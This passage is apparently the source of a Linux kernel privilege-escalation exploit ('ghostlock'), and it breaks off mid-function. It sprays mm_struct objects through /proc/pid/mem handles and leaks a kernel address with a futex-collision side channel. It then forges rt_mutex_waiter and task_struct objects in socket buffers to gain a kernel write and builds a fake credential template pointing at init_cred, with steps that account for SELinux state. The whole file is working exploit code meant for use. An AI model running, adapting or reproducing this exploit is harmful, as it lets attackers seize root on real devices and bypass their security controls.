#include "common.h"
#include "runtime_struct_offsets.h"

#include <array>
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"
#include "target.h"
#include "kernelsnitch/kernelsnitch.h"

#define ks (g_exploit_session.heap.snitch)
#define mm_objs_per_slab (g_exploit_session.heap.mm_objs_per_slab)
#define skb_buf (g_exploit_session.heap.skb_buffer.get())
#define reclaim_sv (g_exploit_session.heap.current.reclaim.fd)
#define prepare_ctx (g_exploit_session.heap.prepare)
#define spray_ctx (g_exploit_session.heap.spray)
#define pre_ctx (g_exploit_session.heap.pre)
#define post_ctx (g_exploit_session.heap.post)
#define child_leak (g_exploit_session.heap.leak_child)

namespace ghostlock::support {

static const struct kernel_offsets *profile_values(void) {
  return target_profile_values(&g_exploit_session.profile);
}

/* Decoupling plan: compute elapsed monotonic time. Input: const reference
 * timestamp; output: milliseconds. Future: shared_elapsed_ms(const timespec *). */
static long long ms_since(const struct timespec *t0) {
  return (long long)runtime_elapsed_ms(t0);
}

/* Persist stage-boundary diagnostics before a kernel panic or filesystem
 * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
void log_sync(void) {
  fflush(stdout);
  (void)fsync(STDOUT_FILENO);
}

/* Decoupling plan: decide whether TCP zerocopy is selected. Inputs: profile and
 * runtime-config snapshot; output: boolean. Future:
 * tcp_zerocopy_supports(profile, config), with no environment reread. */
int tcp_route_selected(void) {
  return target_profile_route(&g_exploit_session.profile) == kRouteTcpZerocopy;
}

/* Decoupling plan: report multicast-waiter capability. Input: profile; output:
 * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
int kernel5_route_selected(void) {
  return target_profile_route(&g_exploit_session.profile) == kRouteMulticastWaiter;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
  if (!fd.valid()) {
    return;
  }
  const ssize_t n = read(fd.get(), buf, len - 1);
  const int saved_errno = errno;
  fd.reset();
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

/* Decoupling plan: log a captured runtime configuration. Input: RuntimeConfig;
 * output: diagnostics only. Future: runtime_config_log(const RuntimeConfig *). */
void log_startup_context(void) {
  std::array<char, 256> attr{};
  std::array<char, 32> enforce{};
  std::array<char, 4096> status{};
  std::array<char, 160> limits{};
  snprintf(limits.data(), limits.size(),
          "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
  read_first_line("/proc/self/attr/current", attr.data(), attr.size());
  read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status.data(), status.size() - 1);
    close(fd);
    if (n > 0) {
      status[static_cast<size_t>(n)] = 0;
      const std::array<const char *, 3> names = {
              "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      std::array<std::array<char, 32>, 3> values = {{
              std::array<char, 32>{"?"},
              std::array<char, 32>{"?"},
              std::array<char, 32>{"?"},
      }};
      for (size_t i = 0; i < names.size(); i++) {
        char *p = strstr(status.data(), names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= values[i].size()) {
            len = values[i].size() - 1;
          }
          memcpy(values[i].data(), p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0].data(), values[1].data(),
               values[2].data());
    }
  }
  struct timespec boot;
  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
  double boot_ms =
      (double) boot.tv_sec * 1000.0 + (double) boot.tv_nsec / 1e6;
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
             "boot_ms=%.0f attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
             attr.data(), enforce.data());
  pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)memory::resolved_addresses_kernel_phys_load(
                 &g_exploit_session.addresses),
             (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
                 &g_exploit_session.addresses) -
                                  P0_PHYS_OFFSET),
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const void *timeout_or_value, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
  long ret = syscall(274, tid, &attr, 0);
  if (ret != 0) {
    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

/* Decoupling plan: resolve physical/image address mapping. Input: target
 * profile; output: ghostlock::memory::ResolvedAddresses. Future: resolve_runtime_addresses(). */
void init_p0_profile(void) {
  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
          (unsigned long long)memory::resolved_addresses_kernel_phys_load(
              &g_exploit_session.addresses),
          (unsigned long long)(memory::resolved_addresses_kernel_phys_load(
              &g_exploit_session.addresses) -
                               P0_PHYS_OFFSET));
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* Decoupling plan: encode the profile-specific credential template. Inputs:
 * profile, destination and offset; output: validation/status. Future:
 * payload_build_credential_template(profile, buffer, offset). */
static int fill_profile_cred_copy(unsigned char *p, size_t off) {
  const struct kernel_offsets *v = profile_values();
  if (!v || !v->cred_copy_size || v->cred_copy_size > ORDER3_SIZE ||
      v->cred_usage_offset + sizeof(uint32_t) > v->cred_copy_size ||
      v->cred_caps_offset + v->cred_caps_count * sizeof(uint64_t) >
          v->cred_copy_size) {
    pr_error("credential copy profile is incomplete\n");
    return 0;
  }
  unsigned char *c = p + off;
  memset(c, 0, v->cred_copy_size);
  put32(c, v->cred_usage_offset, v->cred_usage_value);
  for (uint32_t i = 0; i < v->cred_caps_count; i++) {
    put64(c, v->cred_caps_offset + i * sizeof(uint64_t), v->cred_caps_value);
  }

  const std::array<uint32_t, 4> ref_offsets = {
      v->cred_ref0_offset, v->cred_ref1_offset,
      v->cred_ref2_offset, v->cred_ref3_offset,
  };
  const std::array<uint64_t, 4> ref_images = {
      v->cred_ref0_image, v->cred_ref1_image,
      v->cred_ref2_image, v->cred_ref3_image,
  };
  for (size_t i = 0; i < v->cred_ref_count; i++) {
    if (ref_offsets[i] + sizeof(uint64_t) > v->cred_copy_size) {
      pr_error("credential reference %zu exceeds configured copy size\n", i);
      return 0;
    }
    put64(c, ref_offsets[i],
          memory::resolved_addresses_data_alias(&g_exploit_session.addresses, ref_images[i]));
  }
  return 1;
}

/* Decoupling plan: create an mm-allocation helper child. Input: heap context;
 * output: owned PID. Future: heap_context_spawn_mm_child(). */
pid_t clone_child(void) {
  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core((size_t) runtime_config_snapshot().main_cpu);
    for (;;) {
      pause();
    }
  }
  return child;
}

/* Decoupling plan: create and retain the leak helper child. Input/output: heap
 * context; output: owned PID. Future: heap_context_spawn_leak_child(). */
pid_t clone_leak_child(void) {
  pid_t child = (pid_t) SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0));
  if (child == 0) {
    kernelsnitch_context_find_collisions(ks);
    exit(0);
  }
  return child;
}

/* Decoupling plan: open the child-related memfd allocation. Input: PID; output:
 * owned fd/error. Future: heap_context_open_memfd(context, child). */
int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

/* Decoupling plan: terminate and reap a heap helper. Input: owned PID; output:
 * ownership cleared. Future: heap_context_reap_child(). */
void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, nullptr, 0));
}

/* Decoupling plan: release the current reclaim socket pair. Input/output: heap
 * context. Future: reclaim_pair_destroy(ghostlock::memory::ReclaimPair *). */
void close_reclaim_sockets(void) {
  memory::payload_page_destroy(&g_exploit_session.heap.current);
}

/* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
 * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
int quarantine_reclaim_sockets(void) {
  return memory::payload_page_move(&g_exploit_session.heap.quarantine,
                           &g_exploit_session.heap.current,
                           memory::PayloadPageState::Quarantined);
}

/* Decoupling plan: release all quarantined reclaim ownership. Input/output:
 * heap context. Future: heap_context_release_quarantine(). */
void release_quarantined_reclaim_sockets(void) {
  memory::payload_page_destroy(&g_exploit_session.heap.quarantine);
}

/* Decoupling plan: move the current payload page into the prebuilt slot. Input:
 * heap context; output: move status. Future: ghostlock::memory::payload_page_move(prebuilt,current). */
int stash_prebuilt_page(void) {
  return memory::payload_page_move(&g_exploit_session.heap.prebuilt,
                           &g_exploit_session.heap.current,
                           memory::PayloadPageState::Prebuilt);
}

/* Decoupling plan: move the prebuilt page into the active slot. Input/output:
 * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
int activate_prebuilt_page(void) {
  if (!memory::payload_page_has_reclaim(&g_exploit_session.heap.prebuilt)) return 0;
  close_reclaim_sockets();
  return memory::payload_page_move(&g_exploit_session.heap.current,
                           &g_exploit_session.heap.prebuilt,
                           memory::PayloadPageState::Current);
}

/* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
 * heap context. Future: ghostlock::memory::payload_page_destroy(&context->prebuilt). */
void discard_prebuilt_page(void) {
  memory::payload_page_destroy(&g_exploit_session.heap.prebuilt);
}

/* Decoupling plan: clean one heap-preparation attempt. Input: ghostlock::memory::HeapContext;
 * output: all attempt-owned resources released. Future:
 * heap_context_reset_attempt(), separate from route cleanup. */
void cleanup_page_prepare_state(void) {
  memory::close_ctx_memfds(&prepare_ctx);
  memory::close_ctx_memfds(&spray_ctx);
  memory::close_ctx_memfds(&pre_ctx);
  memory::close_ctx_memfds(&post_ctx);
  if (g_exploit_session.heap.leak_memfd.get() > 0) {
    g_exploit_session.heap.leak_memfd.reset();
  }
  memory::free_ctx_storage(&prepare_ctx);
  memory::free_ctx_storage(&spray_ctx);
  memory::free_ctx_storage(&pre_ctx);
  memory::free_ctx_storage(&post_ctx);
  g_exploit_session.heap.skb_buffer.reset();
}

/* Decoupling plan: create a helper child and associated memfd. Input/output:
 * heap context; output: owned fd/error. Future: heap_context_clone_memfd(). */
int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

/* Decoupling plan: allocate the four mm-context sets used for heap shaping.
 * Inputs: profile and ghostlock::memory::HeapContext; output: initialized sets/status. Future:
 * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
void prepare_ctxs(void) {
  prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
  prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);

  spray_ctx.childs.assign((1 + MM_PARTIALS) * mm_objs_per_slab, 0);
  spray_ctx.memfds.assign((1 + MM_PARTIALS) * mm_objs_per_slab, 0);

  pre_ctx.childs.assign(mm_objs_per_slab - 1, 0);
  pre_ctx.memfds.assign(mm_objs_per_slab - 1, 0);

  post_ctx.childs.assign(mm_objs_per_slab, 0);
  post_ctx.memfds.assign(mm_objs_per_slab, 0);
}

/* Decoupling plan: construct shared fake objects and route-specific waiter data.
 * Inputs: profile, addresses, immutable WriteRequest and page base; outputs:
 * payload bytes/layout. Future: build_payload() plus three chain encoders. */
int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  int tcp = tcp_route_selected();
  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;

  uintptr_t payload_base = base + (uintptr_t) payload_delta;

  (g_exploit_session.heap.current.fake_lock) = payload_base + LOCK_OFF;
  (g_exploit_session.heap.current.fake_w0) = payload_base + W0_OFF;
  (g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
  uintptr_t default_fops = payload_base + FOPS_TABLE_OFF;
  uintptr_t credential_fops =
      payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
  PayloadWriteLayout write_layout = payload_write_layout(
      request, base, default_fops, credential_fops,
      memory::resolved_addresses_data_alias(&g_exploit_session.addresses,
                                    memory::resolved_addresses_init_cred_image(
                                        &g_exploit_session.addresses)));
  (g_exploit_session.heap.current.fake_parent) = write_layout.parent;
  (g_exploit_session.heap.current.fake_right) = write_layout.right;
  (g_exploit_session.heap.current.fake_left) = write_layout.left;
  (g_exploit_session.heap.current.fake_fops) = write_layout.fops;

  uintptr_t write_pc = (g_exploit_session.heap.current.fake_parent);
  uintptr_t write_right = (g_exploit_session.heap.current.fake_right);
  uintptr_t write_left = (g_exploit_session.heap.current.fake_left);
  /* Direct-map aliases (data_addr) resolve to the same physical pages and are
   * dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK
   * the same way for the on-stack waiter (upstream U01-D). */
  uint64_t waiter_task = SLIDE_INIT_TASK;
  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
  uint64_t pi_top_task = SLIDE_INIT_TASK;

  const struct kernel_offsets *v = profile_values();
  int compact = target_profile_has_compact_waiter(&g_exploit_session.profile);

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + chunk_bias;

    put32(p, LOCK_OFF + 0x00, 0);
    put64(p, LOCK_OFF + 0x08, (g_exploit_session.heap.current.fake_w0));
    put64(p, LOCK_OFF + 0x10, (g_exploit_session.heap.current.fake_w0));
    put64(p, LOCK_OFF + 0x18, (g_exploit_session.heap.current.fake_task) | 1);

    if (compact) {
      /* Words ride the erase relink: pc = value, rb_left = dest,
       * rb_right = 0 or the one-child arm also clobbers *(value) with
       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
       * would leave the node parentless for enqueue_pi to trash
       * fake_task. prio > 120 gates this erase. The relink's second
       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
      (void) encode_compact_waiter(
          {reinterpret_cast<std::byte *>(p + W0_OFF),
           kCompactWaiterBytes},
          *request, write_layout);
      put64(p, W0_OFF + 0x30, waiter_task); /* task */
      put64(p, W0_OFF + 0x38, (g_exploit_session.heap.current.fake_lock));   /* lock */
      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
      put64(p, W0_OFF + 0x48, 0);           /* deadline */
      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
    } else {
      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
      put64(p, W0_OFF + 0x00, 1);
      put64(p, W0_OFF + 0x08, 0);
      put64(p, W0_OFF + 0x10, 0);
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, (g_exploit_session.heap.current.fake_lock));
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }

    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
    uint32_t ft_prio_off       = compact ? v->task_prio
                                         : FAKE_TASK_PRIO_OFF;
    uint32_t ft_nprio_off      = compact ? v->task_normal_prio
                                         : FAKE_TASK_NORMAL_PRIO_OFF;
    uint32_t ft_tg_off         = compact ? v->task_sched_task_group
                                         : FAKE_TASK_TASK_GROUP_OFF;
    uint32_t ft_pi_lock_off    = compact ? v->task_pi_lock
                                         : FAKE_TASK_PI_LOCK_OFF;
    uint32_t ft_pi_wait_off    = compact ? v->task_pi_waiters
                                         : FAKE_TASK_PI_WAITERS_OFF;
    uint32_t ft_pi_top_off     = compact ? v->task_pi_top_task
                                         : FAKE_TASK_PI_TOP_TASK_OFF;
    uint32_t ft_pi_blocked_off = compact ? v->task_pi_blocked_on
                                         : FAKE_TASK_PI_BLOCKED_ON_OFF;

    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
    put32(p, fake_task_off + ft_pi_lock_off, 0);
    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
    put64(p, fake_task_off + ft_pi_wait_off, 0);
    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
    put64(p, fake_task_off + ft_tg_off, task_group);
    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
    put64(p, fake_task_off + ft_pi_blocked_off, 0);

    put64(p, RIGHT_OFF + 0x00, (g_exploit_session.heap.current.fake_parent));
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, (g_exploit_session.heap.current.fake_parent));
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (write_layout.needs_credential_copy &&
        !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)) {
      return 0;
    }
  }
  return 1;
}

/* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
 * Inputs: ghostlock::memory::HeapContext, profile and payload request; output: ghostlock::memory::PayloadPage/status.
 * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
/* TODO(CPP07-OWNER): partial prepare failure injection still needs a
 * syscall-level fault-injection framework; the ownership refactor itself is
 * complete (CPP12h). Completion: add the framework, cover the early-exit
 * paths, then delete this comment and the residual row. */
uintptr_t prepare_kernel_page(const WriteRequest *request) {
  struct timespec t_spray;
  clock_gettime(CLOCK_MONOTONIC, &t_spray);
  /* Release every userspace reference from the preceding write before the
   * context arrays are replaced. Keeping the final post-spray memfd pinned
   * leaked one mm_struct per stage and progressively poisoned later sprays. */
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  mm_objs_per_slab = ORDER3_SIZE /
          target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ);
  prepare_ctxs();

  g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  KernelSnitchOwner snitch = KernelSnitchOwner::create(
      target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ),
      MM_ORDER, (size_t) cpu_count, kernelsnitch_collisions(), 0,
      (size_t) runtime_config_snapshot().main_cpu);
  /* The forked leak child borrows the shared mmap context through this
   * compatibility alias; the owner remains the only releaser. */
  auto clear_snitch_alias =
      make_scope_exit([]() noexcept { ks = nullptr; });
  ks = snitch.get();
  pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
          cpu_count, ms_since(&t_spray));

  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
    pre_ctx.childs[i] = clone_child();
  }
  child_leak = ChildProcess(clone_leak_child());
  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
    post_ctx.childs[i] = clone_child();
  }

  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
  }
  g_exploit_session.heap.leak_memfd.reset(open_memfd(child_leak.get()));
  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
  }

  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
    kill_child(pre_ctx.childs[i]);
  }
  for (size_t i = 0; i < post_ctx.childs.size(); i++) {
    kill_child(post_ctx.childs[i]);
  }
  for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
    kill_child(spray_ctx.childs[i]);
  }
  pr_info("[spray] finding futex collisions... +%lldms\n",
          ms_since(&t_spray));
  {
    struct timespec t_wait;
    clock_gettime(CLOCK_MONOTONIC, &t_wait);
    const pid_t leak_pid = child_leak.get();
    int leak_status = 0;
    pid_t wp = 0;
    long long last_beat = 0;
    for (;;) {
      wp = waitpid(leak_pid, &leak_status, WNOHANG);
      if (wp == leak_pid) {
        child_leak.mark_reaped();
        break;
      }
      if (wp < 0) {
        pr_warning("waitpid leak child: %m\n");
        child_leak.mark_reaped();
        break;
      }
      long long waited = ms_since(&t_wait);
      uint32_t timeout_ms =
          target_profile_execution(&g_exploit_session.profile)
              ->heap_kernelsnitch_timeout_ms;
      if ((uint64_t)waited >= timeout_ms) {
        pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
        (void) child_leak.terminate_and_wait(SIGKILL);
        break;
      }
      if (waited - last_beat >= 2000) {
        size_t scan_done = ks->scan_done;
        size_t scan_total = ks->total_futexes;
        if (scan_done > scan_total) scan_done = scan_total;
        size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
        if (scan_id > (size_t)FUTEX_SZ) scan_id = (size_t)FUTEX_SZ;
        pr_info("[spray]   still finding collisions (%llds) %zu%% "
                "(futex 0x%zx/0x%zx)...\n",
                waited / 1000,
                scan_total ? scan_done * 100 / scan_total : 0,
                scan_id, (size_t)FUTEX_SZ);
        last_beat = waited;
      }
      usleep(50000);
    }
    if (wp == leak_pid &&
        (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
      pr_warning("leak child exit status=%d\n", leak_status);
    }
  }
  if (!snitch.has_collisions()) {
    pr_warning("[spray] futex collisions not found\n");
    snitch.reset();
    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  pr_info("[spray] futex collisions found +%lldms\n",
          ms_since(&t_spray));
  (void)snitch.scan();
  pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
          snitch.result(), ms_since(&t_spray));
  uintptr_t leaked = snitch.result();
  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
  leaked |= (uintptr_t)0xf << 56;
  (g_exploit_session.heap.current.last_mm_struct) = leaked;
  /* mm_structs live in the direct map */
  if (leaked == (uintptr_t)-1 ||
      leaked < KERNELSNITCH_IDENTITY_START ||
      leaked >= g_direct_map_end) {
    pr_warning("KernelSnitch mm_struct leak failed\n");
    snitch.reset();
    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  if (!prepare_skb_payload(base, request)) {
    snitch.reset();
    for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
      kill_child(prepare_ctx.childs[i]);
    }
    cleanup_page_prepare_state();
    return 0;
  }

  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
  g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
  int sndbuf = 1 << 20;
  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (reclaim_flags >= 0) {
    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
  }
  int pcp_shaping_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = skb_buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

  pin_to_core((size_t) runtime_config_snapshot().main_cpu);
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK_pr(close(g_exploit_session.heap.leak_memfd.release()), "SYSCHK(" "close(memfd_leak)" "): %m\n");
  g_exploit_session.heap.leak_memfd.reset();
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
  snitch.reset();

  for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

/* Decoupling plan: retry heap preparation until a usable page is available.
 * Inputs: ghostlock::memory::HeapContext and request; output: ghostlock::memory::PayloadPage/status. Future:
 * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
  const struct execution_settings *execution =
      target_profile_execution(&g_exploit_session.profile);
  int max_attempts = (int)execution->heap_prepare_max_attempts;
  struct timespec t_good;
  clock_gettime(CLOCK_MONOTONIC, &t_good);
  struct timespec deadline = t_good;
  uint64_t timeout_ns =
      (uint64_t)execution->heap_prepare_timeout_ms * 1000000ULL;
  deadline.tv_sec += (time_t)(timeout_ns / 1000000000ULL);
  deadline.tv_nsec += (long)(timeout_ns % 1000000000ULL);
  if (deadline.tv_nsec >= 1000000000L) {
    deadline.tv_sec++;
    deadline.tv_nsec -= 1000000000L;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(request);
    if (base) {
      PayloadWriteLayout layout = {
        .parent = (g_exploit_session.heap.current.fake_parent),
        .right = (g_exploit_session.heap.current.fake_right),
        .left = (g_exploit_session.heap.current.fake_left),
        .fops = (g_exploit_session.heap.current.fake_fops),
      };
      if (!payload_write_layout_matches_request(request, &layout)) {
        pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                   request->preserve_child, layout.right);
      } else if (!payload_write_layout_accepts_page(request, &layout)) {
        pr_warning("page %016zx stores an even byte over "
                   "selinux_state.initialized; taking another\n", base);
      } else {
        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
                ms_since(&t_good));
        return base;
      }
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    if (now.tv_sec > deadline.tv_sec ||
